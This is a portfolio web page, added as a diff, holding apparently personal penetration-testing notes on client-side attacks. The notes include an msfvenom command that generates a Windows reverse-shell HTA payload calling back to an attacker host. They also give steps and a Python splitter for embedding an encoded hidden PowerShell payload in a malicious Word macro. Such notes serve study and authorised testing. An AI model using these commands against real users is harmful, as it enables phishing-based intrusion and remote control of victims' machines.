@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <link rel="stylesheet" href="assets/css/swiper-bundle.min.css">
+
+    <!--==================== CSS ====================-->
+    <link rel="stylesheet" href="assets/css/method-styles.css">
+
+    <title>TITLE</title>
+</head>
+<body class="dark-theme">
+    <!--==================== HEADER ====================-->
+    <header class="header" id="header">
+        <nav class="nav container">
+            <a href="#" class="nav__logo">Tyler O'Hare</a>
+            <div class="nav__menu" id="nav-menu">
+                <ul class="nav__list grid">
+                    <li class="nav__item">
+                        <a href="#home" class="nav__link active-link">
+                            <i class="uil uil-estate nav__icon"></i> Home
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#skills" class="nav__link">
+                            <i class="uil uil-file-alt nav__icon"></i> Skills
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#portfolio" class="nav__link">
+                            <i class="uil uil-scenery nav__icon"></i> Portfolio
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#contact" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Contact Me
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Methodology
+                        </a>
+                    </li>
+                </ul>
+                <i class="uil uil-times nav__close" id="nav-close"></i>
+            </div>
+
+            <div class="nav__btns">
+                <!--Theme change button-->
+                <i class="uil uil-moon change-theme" id="theme-button"></i>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class="uil uil-apps"></i>
+                </div>
+            </div>
+        </nav>
+    </header>
+    <!--==================== END-HEADER ====================-->
+
+
+<!--==================== MAIN ====================-->
+    <main class="main"><article id="2f2b8c78-875b-4ce2-8d22-9cc055b0f6ec" class="page sans"><header><h1 class="page-title">Client-Side Attacks</h1></header><div class="page-body"><h2 id="36ae3bd7-212d-4816-a115-4096332b995e" class="">HTA Attack:</h2><pre id="8df036af-385a-4466-a6e2-cbcfef66c509" class="code"><code>msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f hta-psh -o evil.hta</code></pre><p id="31f34477-4f2e-4070-8b3f-427bc8461722" class="">
+</p><h2 id="16818168-46f8-4448-9f3f-e4a568103ef8" class=""><strong>Malicious Word Doc:</strong></h2><ol type="1" id="93f7d51d-63a3-46d7-b31b-a5a251afa391" class="numbered-list" start="1"><li>Create Word doc and add a macro…</li></ol><pre id="e50eb888-9633-4e15-9502-5a5ba65d4d71" class="code"><code>sudo cat /var/www/html/evil.hta</code></pre><ol type="1" id="10cf0167-0be7-4989-83c9-5b52b5cea5d8" class="numbered-list" start="2"><li>Put malicious payload into Split.py</li></ol><pre id="973c818f-0235-45d6-923a-fa0165cf059d" class="code code-wrap"><code>str = &quot;powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC.....&quot;
+
+n = 50
+
+for i in range(0, len(str), n):
+	print &quot;Str = Str + &quot; + &#x27;&quot;&#x27; + str[i:i+n] + &#x27;&quot;&#x27;</code></pre><p id="7bb939c7-0e74-45a6-a086-32981275f719" class="">
+</p><ol type="1" id="954f7704-7cec-47d4-b66f-9a4dad274279" class="numbered-list" start="3"><li>Put the output into the Macro and save as a word doc (May need to try different doc versions)</li></ol></div></article></main></main>
+
+    <!--==================== FOOTER ====================-->
+    <footer class="footer">
+        <div class="footer__bg">
+            <div class="footer__container container grid">
+                <div>
+                    <h1 class="footer__title">Tyler O'Hare</h1>
+                    <span class="footer__subtitle">Cybersecurity Engineer</span>
+                </div>
+
+                <ul class="footer__links">
+                    <li>
+                        <a href="#skills" class="footer__link">Skills</a>
+                    </li>
+
+                    <li>
+                        <a href="#portfolio" class="footer__link">Portfolio</a>
+                    </li>
+
+                    <li>
+                        <a href="#contact" class="footer__link">Contact</a>
+                    </li>
+                    <li>
+                        <a href="assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
+                    </li>
+                </ul>
+
+                <div class="footer__socials">
+                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
+                        <i class="uil uil-github-alt"></i>
+                    </a>
+
+                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
+                        <i class="uil uil-linkedin-alt"></i>
+                    </a>
+                </div>
+            </div>
+
+            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
+        </div>
+
+    </footer>
+    <!--==================== END-FOOTER ====================-->
+
+
+    <!--==================== SCROLL TOP ====================-->
+    <a href="" class="scrollup" id="scroll-up">
+        <i class="uil uil-arrow-up scroll__icon"></i>
+    </a>
+
+    <!--==================== SWIPER JS ====================-->
+    <script src="assets/js/swiper-bundle.min.js"></script>
+
+    <!--==================== MAIN JS ====================-->
+    <script src="assets/js/main.js"></script>
+</body>
+</html>
